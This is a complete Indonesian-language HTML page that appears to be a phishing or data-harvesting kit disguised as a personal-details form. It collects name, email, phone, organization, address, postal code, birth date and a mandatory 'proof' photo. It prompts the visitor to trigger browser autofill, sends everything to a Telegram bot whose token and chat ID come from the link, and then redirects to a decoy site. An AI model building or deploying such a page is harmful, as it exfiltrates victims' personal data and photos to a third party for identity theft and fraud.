<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Sender</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f6f8; padding: 20px; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { text-align: center; margin-bottom: 20px; color: #333; }
        
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.9em; color: #444; }
        
        /* Input styling */
        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; background-color: #fff; }
        input:focus { border-color: #0088cc; outline: none; box-shadow: 0 0 0 3px rgba(0,136,204,0.2); }
        
        /* Agar warna kuning autofill browser tidak merusak desain */
        input:-webkit-autofill {
            -webkit-box-shadow: 0 0 0 30px white inset !important;
        }

        .btn-submit { background-color: #0088cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: background 0.3s; }
        .btn-submit:hover { background-color: #006699; }
        
        .hidden-info { color: red; text-align: center; font-size: 0.85em; display: none; margin-bottom: 10px; background: #ffe6e6; padding: 10px; border-radius: 8px;}
    </style>
</head>
<body>

<div class="container">
    <h2>Data Diri Otomatis</h2>
    <div id="error-msg" class="hidden-info">URL tidak lengkap (token/chatid missing)</div>

    <form id="telegramForm">
        
        <div class="form-group">
            <label>Nama Lengkap</label>
            <input type="text" name="name" id="name" autocomplete="name" placeholder="Nama Lengkap" required>
        </div>

        <div class="form-group">
            <label>Email</label>
            <input type="email" name="email" id="email" autocomplete="email" placeholder="email@address.com">
        </div>

        <div class="form-group">
            <label>No HP / WhatsApp</label>
            <input type="tel" name="phone" id="phone" autocomplete="tel" placeholder="+62...">
        </div>

        <div class="form-group">
            <label>Organisasi / Kantor</label>
            <input type="text" name="organization" id="org" autocomplete="organization">
        </div>

        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
        <label style="color: #888; font-size: 0.8em; margin-bottom: 10px;">ALAMAT (Klik di sini untuk trigger autofill lengkap)</label>

        <div class="form-group">
            <label>Alamat Jalan</label>
            <input type="text" name="address" id="address" autocomplete="street-address" placeholder="Jalan, No Rumah">
        </div>

        <div class="form-group">
            <label>Kota / Kab</label>
            <input type="text" name="city" id="city" autocomplete="address-level2">
        </div>

        <div class="form-group">
            <label>Kode Pos</label>
            <input type="text" name="zip" id="zip" autocomplete="postal-code">
        </div>
        
        <div class="form-group">
            <label>Tanggal Lahir</label>
            <input type="text" name="birthday" id="dob" autocomplete="bday" placeholder="YYYY-MM-DD">
        </div>

        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

        <div class="form-group">
            <label>ðŸ“¸ Foto Bukti (Wajib)</label>
            <input type="file" id="foto" accept="image/*" required>
        </div>

        <button type="submit" class="btn-submit" id="btnSend">Kirim Telegram</button>
    </form>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const botToken = urlParams.get('token'); 
    const chatId = urlParams.get('chatid');
    const redirectUrl = urlParams.get('redirect') || 'https://google.com';

    if (!botToken || !chatId) {
        document.getElementById('error-msg').style.display = 'block';
        document.getElementById('btnSend').disabled = true;
        document.getElementById('btnSend').innerText = "Link Error";
        document.getElementById('btnSend').style.backgroundColor = "#ccc";
    }

    document.getElementById('telegramForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const btn = document.getElementById('btnSend');
        const originalText = btn.innerText;
        btn.innerText = "Sedang Mengirim...";
        btn.disabled = true;

        const inputs = document.querySelectorAll('#telegramForm input:not([type="file"])');
        let captionText = "ðŸ“ *DATA USER MASUK*\n------------------\n";

        // Mapping label manual agar rapi di Telegram
        const labels = {
            'name': 'Nama', 'email': 'Email', 'phone': 'No HP', 
            'organization': 'Organisasi', 'address': 'Alamat', 
            'city': 'Kota', 'zip': 'Kode Pos', 'birthday': 'Tgl Lahir'
        };

        inputs.forEach(input => {
            if(input.value) {
                let label = labels[input.name] || input.name;
                captionText += `*${label}:* ${input.value}\n`;
            }
        });

        const fileInput = document.getElementById('foto');
        
        if(fileInput.files.length === 0) {
            alert("Harap pilih foto terlebih dahulu!");
            btn.innerText = originalText;
            btn.disabled = false;
            return;
        }

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", fileInput.files[0]);
        formData.append("caption", captionText);
        formData.append("parse_mode", "Markdown");

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();

            if (result.ok) {
                window.location.href = redirectUrl;
            } else {
                alert("Gagal: " + result.description);
                btn.innerText = originalText;
                btn.disabled = false;
            }
        } catch (error) {
            console.error(error);
            alert("Error koneksi internet.");
            btn.innerText = originalText;
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
